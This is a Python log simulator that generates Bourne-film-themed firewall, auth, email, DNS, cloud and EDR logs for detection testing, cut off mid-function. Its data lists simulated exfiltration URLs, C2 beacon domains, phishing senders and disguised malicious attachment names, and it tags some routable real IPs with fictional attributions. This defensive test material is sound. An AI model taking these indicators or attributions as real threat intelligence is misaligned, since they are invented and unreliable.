#!/usr/bin/env python3
"""
Treadstone Log Simulator
Generates realistic Palo Alto Networks firewall + Linux auth logs populated
with data from the Jason Bourne universe, and ships them to syslog-ng via TCP.

Log formats modeled after:
  - Palo Alto Networks PAN-OS Traffic/Threat/Config/GlobalProtect logs:
      https://docs.paloaltonetworks.com/pan-os/11-1/pan-os-admin/monitoring/use-syslog-for-monitoring/syslog-field-descriptions
  - Linux PAM/sshd: standard RFC 3164 / RFC 5424
  - Apache Combined Log Format: https://httpd.apache.org/docs/current/logs.html
  - Cisco Duo Authentication + Administrator Logs (Admin API v2):
      https://duo.com/docs/adminapi#authentication-logs

Field names for Palo Alto, Windows Event Logs, and Cisco Duo are grounded in
this tenant's own deployed rules (data/extracted.json) rather than the raw
vendor wire format -- see the comments above _panw_event/_win_line/_duo_line.
"""

import os
import json
import random
import socket
import time
import logging
import urllib.request
import urllib.error
from datetime import datetime, timezone
from typing import Callable

# ─── Configuration ─────────────────────────────────────────────────────────────
SYSLOG_HOST    = os.getenv("SYSLOG_HOST", "localhost")
SYSLOG_PORT    = int(os.getenv("SYSLOG_PORT", "601"))
INTERVAL_MS    = int(os.getenv("LOG_INTERVAL_MS", "1500"))
BURST_SIZE     = int(os.getenv("LOG_BURST", "5"))
SCENARIO_CHANCE = float(os.getenv("SCENARIO_CHANCE", "0.02"))  # prob. a burst is a scripted storyline
HOSTNAME_SELF  = "treadstone-sim-01"

# SentinelOne EDR events bypass syslog-ng/DataPipeline entirely and post
# straight into SDL -- real EDR telemetry never flows through a customer's
# DataPipeline HEC pipeline either; the agent reports directly to the S1
# backend. Reuses the same SDL_WRITE_TOKEN already configured for FoundStone.
SDL_BASE_URL    = os.getenv("SDL_BASE_URL", "").rstrip("/")
SDL_WRITE_TOKEN = os.getenv("SDL_WRITE_TOKEN", "")

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
log = logging.getLogger(__name__)

# ─── Jason Bourne Universe Data ────────────────────────────────────────────────

# Operatives and their cover identities — drawn from across all five films
# (Identity, Supremacy, Ultimatum, Legacy, Jason Bourne).
OPERATIVES = [
    # ── Treadstone / Blackbriar field assets ──
    {"name": "david.webb",      "alias": "jason.bourne",       "uid": 1001, "clearance": "TREADSTONE"},
    {"name": "nicky.parsons",   "alias": "sophie.reilly",      "uid": 1002, "clearance": "BLACKBRIAR"},
    {"name": "desh.bouksani",   "alias": "p.hassan",           "uid": 1014, "clearance": "BLACKBRIAR"},
    {"name": "paz",             "alias": "j.castellano",       "uid": 1016, "clearance": "BLACKBRIAR"},
    {"name": "the.professor",   "alias": "m.kiluanyi",         "uid": 1017, "clearance": "TREADSTONE"},
    {"name": "castel",          "alias": "a.dufour",           "uid": 1018, "clearance": "TREADSTONE"},
    {"name": "jarda",           "alias": "j.novotny",          "uid": 1019, "clearance": "TREADSTONE"},
    {"name": "the.asset",       "alias": "c.dassault",         "uid": 1020, "clearance": "IRON-HAND"},
    {"name": "malcolm.smith",   "alias": "m.smith",            "uid": 1021, "clearance": "TREADSTONE"},
    # ── Bourne cover passports from the Zurich box (0094) ──
    {"name": "david.webb",      "alias": "john.michael.kane",  "uid": 1001, "clearance": "TREADSTONE"},
    {"name": "david.webb",      "alias": "foma.kiniaev",       "uid": 1001, "clearance": "TREADSTONE"},
    {"name": "david.webb",      "alias": "gilberto.depiento",  "uid": 1001, "clearance": "TREADSTONE"},
    # ── CIA leadership / handlers ──
    {"name": "ward.abbott",     "alias": "r.thurman",          "uid": 1003, "clearance": "BLACKBRIAR"},
    {"name": "alex.conklin",    "alias": "r.conklin",          "uid": 1007, "clearance": "TREADSTONE"},
    {"name": "pamela.landy",    "alias": "p.landy",            "uid": 1004, "clearance": "BLACKBRIAR"},
    {"name": "noah.vosen",      "alias": "n.vosen",            "uid": 1005, "clearance": "BLACKBRIAR"},
    {"name": "ezra.kramer",     "alias": "e.kramer",           "uid": 1010, "clearance": "BLACKBRIAR"},
    {"name": "albert.hirsch",   "alias": "a.hirsch",           "uid": 1006, "clearance": "TREADSTONE"},
    {"name": "danny.zorn",      "alias": "d.zorn",             "uid": 1022, "clearance": "BLACKBRIAR"},
    {"name": "richard.webb",    "alias": "r.webb",             "uid": 1023, "clearance": "TREADSTONE"},
    # ── Operation Outcome / LARX (Legacy) ──
    {"name": "aaron.cross",     "alias": "kenneth.kitsom",     "uid": 1008, "clearance": "OUTCOME"},
    {"name": "eric.byer",       "alias": "e.byer",             "uid": 1024, "clearance": "OUTCOME"},
    {"name": "marta.shearing",  "alias": "c.burke",            "uid": 1013, "clearance": "OUTCOME"},
    {"name": "outcome.no3",     "alias": "number.three",       "uid": 1025, "clearance": "OUTCOME"},
    {"name": "martin.kreutz",   "alias": "h.schmidt",          "uid": 1009, "clearance": "LARX"},
    # ── Iron Hand / Deep Dream (Jason Bourne, 2016) ──
    {"name": "robert.dewey",    "alias": "r.dewey",            "uid": 1026, "clearance": "IRON-HAND"},
    {"name": "heather.lee",     "alias": "h.lee",              "uid": 1027, "clearance": "IRON-HAND"},
    {"name": "aaron.kalloor",   "alias": "a.kalloor",          "uid": 1028, "clearance": "DEEPDREAM"},
    # ── Journalists / civilians / targets ──
    {"name": "simon.ross",      "alias": "s.ross",             "uid": 1012, "clearance": "PRESS"},
    {"name": "marie.kreutz",    "alias": "marie.helena",       "uid": 1029, "clearance": "CIVILIAN"},
    {"name": "nykwana.wombosi", "alias": "n.wombosi",          "uid": 1030, "clearance": "TARGET"},
    {"name": "vladimir.neski",  "alias": "v.neski",            "uid": 1031, "clearance": "TARGET"},
    # ── Foreign adversaries ──
    {"name": "kirill",          "alias": "g.volkov",           "uid": 1015, "clearance": "HOSTILE"},
    {"name": "yuri.gretkov",    "alias": "y.gretkov",          "uid": 1032, "clearance": "HOSTILE"},
    # ── Langley desk / analysts / scapegoats (expanded bench) ──
    {"name": "tom.cronin",      "alias": "t.cronin",           "uid": 1033, "clearance": "BLACKBRIAR"},
    {"name": "jack.kublinski",  "alias": "j.kublinski",        "uid": 1035, "clearance": "BLACKBRIAR"},
    {"name": "tom.stack",       "alias": "t.stack",            "uid": 1036, "clearance": "BLACKBRIAR"},
    {"name": "sarah.okonkwo",   "alias": "s.okonkwo",          "uid": 1046, "clearance": "BLACKBRIAR"},
    {"name": "frank.meyer",     "alias": "f.meyer",            "uid": 1045, "clearance": "TREADSTONE"},
    {"name": "david.webb",      "alias": "eddie.kim",          "uid": 1001, "clearance": "TREADSTONE"},
    # ── Outcome / LARX bench (Legacy) ──
    {"name": "mark.turso",      "alias": "m.turso",            "uid": 1037, "clearance": "OUTCOME"},
    {"name": "outcome.no4",     "alias": "number.four",        "uid": 1038, "clearance": "OUTCOME"},
    {"name": "outcome.no5",     "alias": "number.five",        "uid": 1039, "clearance": "OUTCOME"},
    # ── Iron Hand / Deep Dream bench (Jason Bourne, 2016) ──
    {"name": "craig.jeffers",   "alias": "c.jeffers",          "uid": 1040, "clearance": "DEEPDREAM"},
    # ── Targets / sources / civilians ──
    {"name": "irena.neski",     "alias": "i.neski",            "uid": 1034, "clearance": "TARGET"},
    {"name": "priya.nair",      "alias": "p.nair",             "uid": 1044, "clearance": "PRESS"},
    {"name": "elena.gorik",     "alias": "e.gorik",            "uid": 1043, "clearance": "TARGET"},
    # ── Foreign adversaries (expanded) ──
    {"name": "olga.kirilenko",  "alias": "o.kirilenko",        "uid": 1041, "clearance": "HOSTILE"},
    {"name": "viktor.szabo",    "alias": "v.szabo",            "uid": 1042, "clearance": "HOSTILE"},
    # ── Treadstone (2019 TV series) — Cold War origin + awakened sleepers ──
    {"name": "randolph.bentley","alias": "j.r.bentley",        "uid": 1047, "clearance": "TREADSTONE"},
    {"name": "doug.mckenna",    "alias": "d.mckenna",          "uid": 1048, "clearance": "TREADSTONE"},
    {"name": "soyun.pak",       "alias": "s.pak",              "uid": 1049, "clearance": "TREADSTONE"},
    {"name": "tara.coleman",    "alias": "t.coleman",          "uid": 1050, "clearance": "BLACKBRIAR"},
    {"name": "matt.edwards",    "alias": "m.edwards",          "uid": 1051, "clearance": "BLACKBRIAR"},
    {"name": "petra",           "alias": "p.hollander",        "uid": 1052, "clearance": "HOSTILE"},
    {"name": "ellen.becker",    "alias": "e.becker",           "uid": 1053, "clearance": "BLACKBRIAR"},
    {"name": "manheim",         "alias": "k.manheim",          "uid": 1054, "clearance": "TREADSTONE"},
]

# CIA / Treadstone internal network hosts
INTERNAL_HOSTS = [
    # Langley core
    "langley-fw01.cia.gov",
    "langley-dc01.cia.gov",
    "treadstone-vpn01.cia.gov",
    "blackbriar-db01.cia.gov",
    "outcome-proxy01.cia.gov",
    "larx-ctrl01.cia.gov",
    "ironhand-ctrl01.cia.gov",
    "ops-dmz-gw01.cia.gov",
    "noc-ids01.cia.gov",
    # Treadstone behavioral-mod facility, NYC (415 E 71st St)
    "treadstone-nyc-lab01.cia.gov",
    # Field stations / embassies
    "embassy-zurich-fw01.cia.gov",
    "embassy-berlin-fw01.cia.gov",
    "embassy-paris-fw01.cia.gov",
    "embassy-moscow-fw01.cia.gov",
    "embassy-madrid-fw01.cia.gov",
    "embassy-athens-fw01.cia.gov",
    "embassy-beirut-fw01.cia.gov",
    "station-munich-01.cia.gov",
    "station-marseille-01.cia.gov",
    "station-vegas-01.cia.gov",
    # Safehouses
    "safehouse-tangier-01.cia.gov",
    "safehouse-naples-01.cia.gov",
    "safehouse-goa-01.cia.gov",
    "safehouse-manila-01.cia.gov",
    "safehouse-turin-01.cia.gov",
    "safe-london-proxy01.cia.gov",
    "safehouse-reykjavik-01.cia.gov",
    # New field stations (expanded footprint)
    "station-rome-01.cia.gov",
    "station-vienna-01.cia.gov",
    "station-copenhagen-01.cia.gov",
    "station-newdelhi-01.cia.gov",
    "safehouse-amsterdam-01.cia.gov",
    "langley-annex02.cia.gov",
    # Treadstone (2019 TV series) locations
    "station-hamburg-01.cia.gov",
    "station-seoul-01.cia.gov",
    "outpost-tulsa-ok.cia.gov",
]

# External / adversary IPs (plausible fiction — RFC 5737 test ranges + routable)
EXTERNAL_IPS = [
    "82.145.67.201",   # "Zurich café — asset observed"
    "195.62.13.45",    # "Berlin cell — Kirill op"
    "91.200.12.178",   # "Moscow SVR relay — Gretkov"
    "46.161.41.100",   # "Tangier SIGINT intercept — Desh"
    "89.149.225.88",   # "Paris dead-drop node"
    "217.31.48.130",   # "Madrid asset comms — Daniels station"
    "185.220.101.45",  # "Tor exit — unattributed"
    "203.0.113.77",    # TEST-NET (safe for simulation per RFC 5737)
    "198.51.100.23",   # TEST-NET
    "192.0.2.145",     # TEST-NET
    "178.62.55.214",   # "London safehouse egress — Waterloo"
    "37.120.198.211",  # "Naples exfil relay"
    "5.9.243.187",     # "Turin dead-drop"
    "188.40.75.132",   # "Goa field asset — Marie"
    "103.21.244.0",    # "Manila cutout — Outcome"
    "62.169.34.77",    # "Athens — riot ops, Nicky"
    "84.17.52.190",    # "Reykjavik — CIA mainframe breach origin"
    "64.124.201.9",    # "Las Vegas — Exocon / Deep Dream"
    "160.153.0.12",    # "Beirut — Richard Webb, 1988"
    "212.95.42.18",    # "Munich — Jarda safehouse"
    "83.245.10.55",    # "Amsterdam — canal-district dead drop, Kirilenko"
    "194.9.108.22",    # "Vienna — Szabo rendezvous"
    "151.38.22.10",    # "Rome — extraction team compromised"
    "195.184.104.13",  # "Copenhagen — SIGINT intercept"
    "103.27.9.44",     # "New Delhi — LARX regional relay"
    "217.110.15.66",   # "Hamburg — Manheim safehouse"
    "121.78.55.12",    # "Seoul — Pak awakening trigger"
    "173.245.10.88",   # "Tulsa, OK — McKenna sleeper activation"
]

INTERNAL_IPS = [
    "10.0.1.10", "10.0.1.11", "10.0.2.20", "10.0.2.21",
    "10.1.0.50", "10.1.0.51", "10.2.5.100", "172.16.10.5",
    "172.16.10.6", "172.20.0.1", "192.168.10.15", "192.168.10.16",
    "10.6.5.100", "10.7.5.100", "10.8.5.100", "10.9.5.100",
    "10.10.5.100", "10.11.5.100", "10.12.5.100",
]

# Geolocation for each external IP — used by Cisco Duo's access_device.location
# block. Bourne-universe field locations.
IP_GEO = {
    "82.145.67.201":  {"city": "Zurich",   "state": "Zurich",        "country": "Switzerland"},
    "195.62.13.45":   {"city": "Berlin",   "state": "Berlin",        "country": "Germany"},
    "91.200.12.178":  {"city": "Moscow",   "state": "Moscow",        "country": "Russia"},
    "46.161.41.100":  {"city": "Tangier",  "state": "Tanger-Tetouan","country": "Morocco"},
    "89.149.225.88":  {"city": "Paris",    "state": "Ile-de-France", "country": "France"},
    "217.31.48.130":  {"city": "Madrid",   "state": "Madrid",        "country": "Spain"},
    "185.220.101.45": {"city": "Unknown",  "state": "Unknown",       "country": "Unknown"},
    "178.62.55.214":  {"city": "London",   "state": "England",       "country": "United Kingdom"},
    "37.120.198.211": {"city": "Naples",   "state": "Campania",      "country": "Italy"},
    "5.9.243.187":    {"city": "Turin",    "state": "Piedmont",      "country": "Italy"},
    "188.40.75.132":  {"city": "Goa",      "state": "Goa",           "country": "India"},
    "103.21.244.0":   {"city": "Manila",   "state": "Metro Manila",  "country": "Philippines"},
    "62.169.34.77":   {"city": "Athens",   "state": "Attica",        "country": "Greece"},
    "84.17.52.190":   {"city": "Reykjavik","state": "Capital Region","country": "Iceland"},
    "64.124.201.9":   {"city": "Las Vegas","state": "Nevada",        "country": "United States"},
    "160.153.0.12":   {"city": "Beirut",   "state": "Beirut",        "country": "Lebanon"},
    "212.95.42.18":   {"city": "Munich",   "state": "Bavaria",       "country": "Germany"},
    "83.245.10.55":   {"city": "Amsterdam","state": "North Holland", "country": "Netherlands"},
    "194.9.108.22":   {"city": "Vienna",   "state": "Vienna",        "country": "Austria"},
    "151.38.22.10":   {"city": "Rome",     "state": "Lazio",         "country": "Italy"},
    "195.184.104.13": {"city": "Copenhagen","state": "Capital Region","country": "Denmark"},
    "103.27.9.44":    {"city": "New Delhi","state": "Delhi",         "country": "India"},
    "217.110.15.66":  {"city": "Hamburg",  "state": "Hamburg",       "country": "Germany"},
    "121.78.55.12":   {"city": "Seoul",    "state": "Seoul",         "country": "South Korea"},
    "173.245.10.88":  {"city": "Tulsa",    "state": "Oklahoma",      "country": "United States"},
    "203.0.113.77":   {"city": "Unknown",  "state": "Unknown",       "country": "Unknown"},
    "198.51.100.23":  {"city": "Unknown",  "state": "Unknown",       "country": "Unknown"},
    "192.0.2.145":    {"city": "Unknown",  "state": "Unknown",       "country": "Unknown"},
}

# Cisco Duo protected applications (themed)
DUO_APPLICATIONS = [
    "BlackBriar VPN",
    "Treadstone Ops Portal",
    "Treadstone Behavioral-Mod Console",
    "Outcome SIGINT Console",
    "LARX Field Comms",
    "Iron Hand Targeting System",
    "Deep Dream Admin Portal",
    "Gemeinschaft Bank Portal",
    "Asset Tracker (CLASSIFIED)",
    "Langley AnyConnect",
    "Embassy RDP Gateway",
    "Rendition Request System",
    "Deep Dream Cyber Ops Console",
    "Insider Threat Review Portal",
    "Vienna Consulate VPN",
    "Treadstone Sleeper Activation Portal",
    "East Berlin Archive Access",
]

# Duo Authentication Proxy hosts that emit the logs
DUO_PROXIES = [
    "duo-authproxy01.cia.gov",
    "duo-authproxy02.cia.gov",
]

# Duo Administrator log events (a second, real Duo log type this tenant's
# rules also reference via unmapped.eventtype=administrator -- distinct from
# the authentication events above). (action, description, severity) grounded
# in this tenant's own deployed Duo rules.
DUO_ADMIN_ACTIONS = [
    ("admin_login_error", "Invalid password attempt", 4),
    ("integration_skey_view", "Integration secret key viewed", 6),
    ("admin_send_reset_password_email", "Password reset email sent", 6),
    ("policy_delete", "MFA policy deleted", 5),
    ("group_create", "Group configuration created", 6),
    ("hardtoken_create", "Hardware token assigned to user", 6),
    ("bypass_create", "Bypass code created by administrator", 5),
    ("admin_single_sign_on_cert_update", "SSO certificate updated", 6),
    ("ldap_directory_conn_create", "LDAP directory connection created", 6),
    ("user_restore", "User account restored", 6),
]
# Plausible Duo administrators -- BLACKBRIAR/TREADSTONE-cleared operatives
# with legitimate admin-console access.
DUO_ADMINS = ["noah.vosen", "pamela.landy", "ezra.kramer", "albert.hirsch"]

# Squid web-proxy hosts (outbound egress gateways)
WEB_PROXIES = [
    "web-proxy01.cia.gov",
    "web-proxy02.cia.gov",
    "outcome-proxy01.cia.gov",
    "safe-london-proxy01.cia.gov",
]

# Egress destinations: (url, peer_ip, content_type). All fake domains use
# RFC 2606 reserved TLDs / example.* so nothing resolves to a real host.
EGRESS_BENIGN = [
    ("http://archive.ubuntu.com/ubuntu/dists/jammy/InRelease", "91.189.91.39",  "text/plain"),
    ("https://login.microsoftonline.com/common/oauth2/token",  "20.190.160.14", "application/json"),
    ("https://www.reuters.com/world/europe/",                  "104.16.118.45", "text/html"),
    ("https://cdn.jsdelivr.net/npm/chart.js",                  "151.101.1.229", "application/javascript"),
    ("https://update.googleapis.com/service/update2",          "142.250.80.110","application/octet-stream"),
    ("https://www.bbc.co.uk/news",                             "151.101.0.81",  "text/html"),
]

EGRESS_SUSPICIOUS = [
    ("http://exfil-relay.example.com/upload",                  "37.120.198.211","application/octet-stream"),
    ("https://deaddrop-tangier.example.net/drop",              "46.161.41.100", "application/octet-stream"),
    ("https://pastebin.example.org/raw/8x9QzKdW",              "185.220.101.45","text/plain"),
    ("http://sigint-cache.example.net/q?id=8812",              "91.200.12.178", "application/json"),
    ("https://filebin.example.org/treadstone-roster.enc",      "89.149.225.88", "application/octet-stream"),
    ("http://203.0.113.77/beacon",                             "203.0.113.77",  "text/plain"),
    # Simon Ross / The Guardian — the burned source leak (Ultimatum)
    ("https://securedrop.theguardian.example.net/source/8812", "178.62.55.214", "application/octet-stream"),
    # Deep Dream — covert CIA backdoor into the social platform (2016)
    ("https://api.deepdream.example.com/v1/users/export",      "64.124.201.9",  "application/json"),
    # Reykjavik — the CIA black-ops mainframe breach (2016)
    ("https://mainframe-gw.cia.example.net/ironhand/dump",     "84.17.52.190",  "application/octet-stream"),
    # Neski files — Berlin embezzlement cover-up (Supremacy)
    ("https://archive.example.org/neski-files-2003.tar.gz",    "195.62.13.45",  "application/gzip"),
    # Gretkov / Pecos Oil money trail
    ("https://pecos-oil.example.com/wire/confirm",             "91.200.12.178", "application/json"),
]

# ── DNS (ISC BIND query log) ──
DNS_RESOLVERS = ["10.0.0.53", "10.0.0.54"]
DNS_BENIGN = [
    ("www.bbc.co.uk", "A"), ("update.googleapis.com", "A"),
    ("archive.ubuntu.com", "A"), ("login.microsoftonline.com", "A"),
    ("outlook.office365.com", "A"), ("time.windows.com", "A"),
    ("cdn.jsdelivr.net", "AAAA"), ("www.reuters.com", "A"),
]
DNS_SUSPICIOUS = [
    ("deaddrop-tangier.example.net", "A"),  ("sigint-cache.example.net", "A"),
    ("exfil-relay.example.com", "A"),       ("mainframe-gw.cia.example.net", "A"),
    ("api.deepdream.example.com", "A"),     ("c2.blackbriar.example.net", "TXT"),
    ("beacon.treadstone.example.net", "TXT"),
]

# ── Mimecast (email security gateway) ──
# Real category values + action set grounded in this tenant's own deployed
# Mimecast-sourced rules (data/extracted.json): unmapped.category
# (phish/Malware/Anonymizers/Compromised/Botnets/Peer-to-Peer/Dangerous file
# extension), unmapped.action/actions/adminOverride (hold/block/bounce),
# actor.invoked_by (Entry Scan/User Click), status_detail (malicious),
# event.type (TTP Attachment/Impersonation Protection).
MIMECAST_MALICIOUS_CATEGORIES = [
    "phish", "Malware", "Anonymizers", "Compromised", "Peer-to-Peer",
]
MIMECAST_BLOCK_ACTIONS = ["hold", "block", "bounce"]
PHISH_SENDERS = [
    ("IT Helpdesk",        "helpdesk@treadstone-ops.example.com"),
    ("Langley Security",   "security-alert@cia-portal.example.net"),
    ("DocuSign",           "no-reply@docusign-secure.example.com"),
    ("Pamela Landy",       "p.landy@cia-gov.example.org"),
    ("Microsoft 365",      "account@ms-office-secure.example.com"),
]
PHISH_ATTACHMENTS = [
    "neski-files.xls.exe", "blackbriar-brief.pdf.scr",
    "asset-roster.docm", "invoice_84412.html", "secure-message.htm",
]
MIMECAST_BENIGN_SENDERS = [
    ("Langley IT",  "it-notifications@cia.gov"),
    ("DocuSign",    "no-reply@docusign.com"),
    ("Zoom",        "no-reply@zoom.us"),
    ("GitHub",      "notifications@github.com"),
]
MIMECAST_BENIGN_SUBJECTS = [
    "Your weekly digest", "Meeting invite: Ops sync", "Signature requested",
    "Security patch notification", "PR review requested",
]

# ── PostgreSQL pgAudit (classified intel DB) ──
DB_NAME = "intel_classified"
DB_OBJECTS = [
    "public.asset_roster", "public.blackbriar_targets", "public.outcome_subjects",
    "public.ironhand_targets", "public.neski_files", "public.cover_identities",
    "public.sigint_intercepts",
]

# ── Windows Security Event log (CIA.LOCAL domain) ──
WIN_HOSTS = [
    "LANGLEY-DC01", "BLACKBRIAR-DB01", "IRONHAND-CTRL01",
    "OUTCOME-WS04", "TREADSTONE-NYC-LAB01", "OPS-DMZ-GW01",
]
WIN_LOGON_TYPES = {2: "Interactive", 3: "Network", 10: "RemoteInteractive"}
WIN_FAIL_STATUS = [
    ("0xC000006D", "0xC0000064", "user name does not exist"),
    ("0xC000006D", "0xC000006A", "bad password"),
    ("0xC0000234", "0x0",        "account locked out"),
    ("0xC0000072", "0x0",        "account disabled"),
]

# ── AWS CloudTrail ──────────────────────────────────────────────────────────
#
# Modeled as a hardened AWS Organization, one account per program. Ambient
# traffic reflects security best practice on purpose: STS AssumeRole only
# (no long-lived access keys, no root usage), MFA-enforced console logins,
# encrypted S3 (SSE-KMS), least-privilege roles, and calls only ever
# originating from known corporate egress IPs. Root usage, MFA-less logins,
# disabled logging, and privilege escalation are deliberately NEVER emitted
# by the ambient generator below -- they only appear inside the dedicated
# attack scenarios (sc_aws_privesc_kublinski, sc_aws_defense_evasion_petra),
# so a detection firing on them means something actually happened.
AWS_ACCOUNTS = {
    "TREADSTONE": "778812340091",
    "BLACKBRIAR": "778812340092",
    "OUTCOME":    "778812340093",
    "IRONHAND":   "778812340094",
}
AWS_REGIONS = ["us-east-1", "eu-central-1", "ap-northeast-2"]
AWS_ROLES = {
    "TREADSTONE": "treadstone-ops-readonly",
    "BLACKBRIAR": "blackbriar-analyst",
    "OUTCOME":    "outcome-larx-readonly",
    "IRONHAND":   "ironhand-targeting-readonly",
}
AWS_S3_BUCKETS = {
    "TREADSTONE": "treadstone-asset-roster-enc",
    "BLACKBRIAR": "blackbriar-intel-archive-enc",
    "OUTCOME":    "outcome-larx-targets-enc",
    "IRONHAND":   "ironhand-targeting-data-enc",
}
# Corporate egress ranges -- benign CloudTrail calls always originate here.
# Only compromise scenarios show a foreign/public source IP.
AWS_TRUSTED_SOURCE_IPS = ["10.0.1.10", "10.0.2.20", "10.1.0.50", "10.2.5.100"]

# ── SentinelOne native EDR telemetry ────────────────────────────────────────
#
# Schema grounded in this tenant's OWN deployed detection library
# (data/extracted.json) rather than guessed: field names (event.type,
# src.process.*/tgt.process.*, endpoint.os, cmdScript.content,
# registry.keyPath, event.dns.request, task.path, module.path) and the
# event.type distribution (Process Creation is overwhelmingly dominant) were
# pulled directly from the 746 real SentinelOne-sourced rules in this tenant.
#
# Same secure-by-default philosophy as AWS: ambient traffic is signed,
# known-publisher, ordinary parent/child process trees. LOLBins, credential
# dumping, reverse shells, unsigned binaries, and persistence mechanisms are
# deliberately NEVER ambient -- they only appear in the dedicated EDR attack
# scenarios below.
EDR_ENDPOINTS = {
    # hostname -> os  (reuses existing WIN_HOSTS/INTERNAL_HOSTS as the same
    # machines' EDR agent, plus a couple of analyst laptops for osx coverage)
    "LANGLEY-DC01": "windows", "BLACKBRIAR-DB01": "windows",
    "IRONHAND-CTRL01": "windows", "OUTCOME-WS04": "windows",
    "TREADSTONE-NYC-LAB01": "windows", "OPS-DMZ-GW01": "windows",
    "embassy-berlin-fw01.cia.gov": "linux", "outpost-tulsa-ok.cia.gov": "linux",
    "station-vienna-01.cia.gov": "linux", "blackbriar-db01.cia.gov": "linux",
    "sarah-okonkwo-mbp.cia.gov": "osx", "tom-stack-mbp.cia.gov": "osx",
}
EDR_AGENT_VERSION = "23.4.2.10"
EDR_SIGNED_PUBLISHERS = ["Microsoft Corporation", "Microsoft Windows", "Google LLC", "Apple Inc."]
EDR_BENIGN_PROCS = [
    # (parent_name, parent_cmdline, child_name, child_cmdline, publisher)
    ("explorer.exe", "C:\\Windows\\explorer.exe", "chrome.exe", "chrome.exe --profile-directory=Default", "Google LLC"),
    ("services.exe", "C:\\Windows\\System32\\services.exe", "svchost.exe", "svchost.exe -k netsvcs -p", "Microsoft Corporation"),
    ("bash", "-bash", "curl", "curl -s https://update.googleapis.com/service/update2", "Google LLC"),
    ("bash", "-bash", "git", "git fetch origin main", "Microsoft Corporation"),
    ("launchd", "/sbin/launchd", "softwareupdated", "/usr/libexec/softwareupdated", "Apple Inc."),
    ("powershell.exe", "powershell.exe -NoProfile", "Get-Process", "Get-Process | Where-Object {$_.CPU -gt 10}", "Microsoft Corporation"),
]

# CIA-plausible destination ports
SENSITIVE_PORTS = {
    22:   "SSH",
    443:  "HTTPS",
    8443: "MGMT-HTTPS",
    5060: "SIP",
    1194: "OpenVPN",
    4500: "IKE-NAT-T",
    500:  "IKE",
    1433: "MSSQL",
    5432: "PostgreSQL",
    6379: "Redis",
    8080: "HTTP-ALT",
    9200: "Elasticsearch",
    2222: "SSH-ALT",
}

PANW_FIREWALLS = [
    {"host": "langley-fw01.cia.gov",        "ip": "10.0.0.1"},
    {"host": "embassy-zurich-fw01.cia.gov", "ip": "10.1.0.1"},
    {"host": "embassy-berlin-fw01.cia.gov", "ip": "10.2.0.1"},
    {"host": "embassy-madrid-fw01.cia.gov", "ip": "10.3.0.1"},
    {"host": "embassy-athens-fw01.cia.gov", "ip": "10.4.0.1"},
    {"host": "station-vegas-01.cia.gov",    "ip": "10.5.0.1"},
    {"host": "ops-dmz-gw01.cia.gov",        "ip": "172.16.0.1"},
    {"host": "noc-ids01.cia.gov",           "ip": "10.0.10.5"},
    {"host": "station-rome-01.cia.gov",       "ip": "10.6.0.1"},
    {"host": "station-vienna-01.cia.gov",     "ip": "10.7.0.1"},
    {"host": "station-copenhagen-01.cia.gov", "ip": "10.8.0.1"},
    {"host": "station-newdelhi-01.cia.gov",   "ip": "10.9.0.1"},
    {"host": "station-hamburg-01.cia.gov",    "ip": "10.10.0.1"},
    {"host": "station-seoul-01.cia.gov",      "ip": "10.11.0.1"},
    {"host": "outpost-tulsa-ok.cia.gov",      "ip": "10.12.0.1"},
]

# App-ID names for ordinary ambient traffic (PAN-OS's real "app" field).
PANW_APPS_BENIGN = ["ssl", "web-browsing", "dns", "ms-office365", "google-base", "ssh", "ntp"]

# Named Bourne-universe Threat-log signatures used inside scripted scenarios
# (sub_type=vulnerability is PAN-OS's real Threat-log subtype for a custom/
# fictional IPS signature hit -- see _panw_event).
PANW_NARRATIVE_SIGNATURES = {
    "beacon":            "Treadstone Asset Beacon Detected",
    "c2":                "Blackbriar Kill-Order C2 Channel",
    "reykjavik":         "Reykjavik Mainframe Breach Signature",
    "deepdream":         "Deep Dream Backdoor Callback",
    "neski":             "Neski Files Exfiltration Attempt",
    "insider":           "Insider Exfil Pattern - Kublinski Signature",
    "sleeper":           "Treadstone Sleeper Activation Beacon",
}

# Generic (non-narrative) threat names for ordinary ambient Threat-log hits --
# these are properly caught/blocked, same secure-by-default philosophy as
# every other source (see the AWS CloudTrail / SentinelOne EDR comments above).
PANW_AMBIENT_THREATS = [
    ("virus", "malware", "Generic.Trojan.Agent", "high"),
    ("url", "malware", None, "medium"),
    ("vulnerability", None, "Suspicious Port Scan Activity", "medium"),
]

HTTP_PATHS = [
    # Operation databases
    "/api/v2/ops/treadstone/roster",
    "/api/v2/ops/blackbriar/status",
    "/api/v2/ops/ironhand/targets",
    "/api/v2/sigint/intercepts",
    "/secure/asset-tracker",
    "/ops/larx/targets",
    "/ops/outcome/chem-protocol/blue",
    "/ops/outcome/chem-protocol/green",
    # Personnel lookups — the people Bourne hunts (or who hunt him)
    "/intel/db/search?q=webb+david",
    "/intel/db/search?q=parsons+nicky",
    "/intel/db/search?q=daniels+neal",
    "/intel/db/search?q=cross+aaron",
    "/intel/db/passport?name=john+michael+kane",
    "/intel/db/passport?name=foma+kiniaev",
    # The Neski files — the lie at the heart of Supremacy
    "/intel/archive/neski-files-2003",
    "/intel/archive/abbott-pecos-wire",
    # Surveillance media
    "/media/surveillance/ZRH-2004-12-07.mp4",
    "/media/surveillance/BER-2007-09-14.mp4",
    "/media/surveillance/WATERLOO-2007-cctv.mp4",
    "/media/surveillance/ATHENS-2016-riot.mp4",
    # Deep Dream backdoor + comsec
    "/deepdream/admin/users/export",
    "/comsec/keygen",
    "/auth/token/refresh",
    "/api/v2/outcome/subject/8812",
    # Cover-up
    "/admin/purge-logs",
    "/ops/rendition/request",
    "/healthz",
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
    "CIA-Classified-Client/3.2 (+https://intranet.cia.gov/)",
    "BlackBriarOpsConsole/1.8 Python/3.11",
    "IronHandTargeting/4.0 (Langley)",
    "DeepDreamBackdoor/0.9 (do-not-log)",
    "curl/8.1.2",
    "Wget/1.21.4",
]

# ─── Syslog RFC 5424 helpers ───────────────────────────────────────────────────

def pri(facility: int, severity: int) -> int:
    return facility * 8 + severity

def rfc5424(severity: int, facility: int, hostname: str, appname: str,
            procid: str, msgid: str, message: str) -> str:
    """Build an RFC 5424 syslog frame (no structured-data for simplicity)."""
    ts = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"
    priority = pri(facility, severity)
    header = f"<{priority}>1 {ts} {hostname} {appname} {procid} {msgid} -"
